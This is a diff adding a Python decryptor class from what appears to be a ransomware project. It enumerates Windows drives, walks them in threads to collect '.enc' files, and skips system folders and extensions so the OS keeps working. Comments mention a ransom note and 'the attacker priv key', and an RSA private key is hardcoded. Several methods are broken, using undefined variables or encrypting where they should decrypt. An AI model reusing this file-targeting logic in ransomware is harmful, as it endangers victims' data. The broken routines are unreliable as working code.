@@ -1,0 +1,139 @@
+from symEncryption import *
+import ctypes
+import concurrent.futures # voor threading pools
+import os
+import time
+from keygen import *
+from collections import deque # voor snellere list operaties
+
+class Decryptor:
+
+    def __init__(self, private_key):
+        self.private_key = private_key
+        self.drives = []
+        self.filepaths = []
+
+    def scan_drives(self):
+        """
+        a function which scans drives A-Z
+        """
+        start_time = time.time()
+        bitmask = ctypes.windll.kernel32.GetLogicalDrives() #returns a bitmask where each bit represents a drive letter. 
+        self.drives = [f"{chr(65 + i)}:\\" for i in range(26) if bitmask & (1 << i)] #converts the bit index into a letter
+        end_time = time.time()
+
+        print(f"[LOG] drives found: {self.drives}, time elapsed: {end_time - start_time}s")
+
+    def get_files_from_drive(self, drive):
+        """Retrieve all file paths for files with the .enc extension from a single drive."""
+        
+        #These are files and directories that we wont encrypt since they will stop the os from functioning
+        EXCLUDED_EXTENSIONS = {".exe", ".dll", ".sys", ".lnk", ".log"}
+        EXCLUDED_FILES = {"boot.ini", "bootmgr", "ntldr", "BCD"} #add ransomnote 
+        EXCLUDED_DIRS = {
+            "C:\\Windows",
+            "C:\\Program Files",
+            "C:\\Program Files (x86)",
+            "C:\\System Volume Information",
+            "C:\\$WINDOWS.~BT"
+        }
+
+        filepaths = []
+        
+        def scan_directory(path):
+            """Recursive scanning using os.scandir()"""
+            try:
+                with os.scandir(path) as it: 
+                    for entry in it:
+                        if entry.is_dir(follow_symlinks=False): #if the entry is a directory, check if it's in EXCLUDED_DIRS
+                            if entry.path in EXCLUDED_DIRS:
+                                continue
+                            scan_directory(entry.path)
+                        
+                        elif entry.is_file():
+                            if (
+                                entry.name.lower() not in EXCLUDED_FILES and #check if its name is in EXCLUDED_FILES
+                                not entry.name.lower().endswith(tuple(EXCLUDED_EXTENSIONS)) #check if it has an excluded extension
+                            ):  
+                                
+                                if ".enc" in entry.name.lower(): #just filter on desktop and pictures
+                                    filepaths.append(entry.path)  # Store normal files
+            
+            except (PermissionError, FileNotFoundError):
+                pass  # skip directories that cannot be accessed
+       
+        scan_directory(drive) #call function scan directory
+
+        #print(filepaths)
+
+        return filepaths
+
+
+    def get_files(self):
+        """
+        run multiple threads at once to scan a drive for files, this will execute file collection across multiple drives at once.
+        Instead of scanning one drive at a time, multiple drives are scanned simultaneously, making it much faster.
+        """
+        start_time = time.time()
+        with concurrent.futures.ThreadPoolExecutor() as executor: #
+            results = executor.map(self.get_files_from_drive, self.drives)
+        
+        # Flatten results
+        self.filepaths = [file for result in results for file in result]  # Extract normal files
+        
+        end_time = time.time()
+        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")
+        print(self.filepaths)
+
+    
+    def get_footer(self, file_contents):
+        with open(file_path, "rb") as encrypted_file:
+            encrypted_file.read()
+
+    def decrypt_footer(self, footer):
+        """
+        this function is called for everyfile and creates the footer
+        """
+        #load in the attacker priv key
+        keygen = Encryption("id:1")
+        #print("[LOG] generating footer")
+        keygen.load_private_key(self.private_key)
+
+
+
+        #encrypt iv
+        encrypted_iv = keygen.encrypt(iv)
+        
+        #encrypt AES key
+        encrypted_key = keygen.encrypt(AES_key)
+        #print(f"footer: {encrypted_iv} {encrypted_key}")
+        #create footer
+        return f"{encrypted_iv} {encrypted_key}"
+
+
+
+
+if __name__ == "__main__":
+    
+    decrypt = Decryptor("""
+-----BEGIN RSA PRIVATE KEY-----
+MIICYAIBAAKBgQCPenTmm5+aJEe6rEFHwwESezFZGv2aZUvZG3muGPRramrhOc9s
+XYnX1gFew3EzgTgzJcSyiBYD4TIzHwBduqzpAQhlo2NgEoiYFtaGge/YmNXLPV7w
+6tL+NgmhAzfC3uGMBRfHpBeMxIN5W3y76DnZnLuO+/tWkPF82UOTzGQREQIDAQAB
+AoGAM2/cTvxFuJX/HR45/Qcc8Eo4A9DYUCy2h2wBMHgD0CqDjKEUCq5yB23Sae25
+PJS72CJXJQYClnt6ardXNt8vMAon+n8cXJWYXxeF+5WqjT740Pwh/dGlYOUsMDKe
+yGH/dS9em2ZZm9JwgKBHi4UT+/9PyyPVB9xb9z02bTGOfT0CRQDVFDTpKeoF3skh
+PqDcdXz0Qv/CKiAt4aCxSPsqWSNpNaKIuker9JUOvKPPEV44LmTJzrrFAc3oXWd1
+3y/1ULey0P1TBwI9AKxhLBYkYot+yh78FJPcCxHlrecZCQFP6C4bowGtyBk4LhRY
+YMIAt9n1/llhNha2dI+hs2GgtkIsny59JwJEVEoTCC1ZcwsHW0xQDAW58VJTpDZP
+1naLv7XUDZOHa4YZDqdJ1N8C2/qJfk8ri2Pm4OIThf1Ju+K/G6S3bv6IPIdpvp8C
+PQCQhGcRqS91A7cwguY9kB03w/cn6DVEhFmDTmg64BcCDbeUFwQHodKBSVsUVAuk
+vxK52DcrgjFLCV3q+8ECRAX0xcZHe/NmVV9bK+SRWyA4ybvio7/gEE9sfJlqeG6G
+rIm8EArVVAlDeDOVgjgKxdnMbgB9wnvB+kjxhjJrcZBbZOtR
+-----END RSA PRIVATE KEY-----
+    """)
+
+    decrypt.scan_drives()
+    decrypt.get_files()
+
+
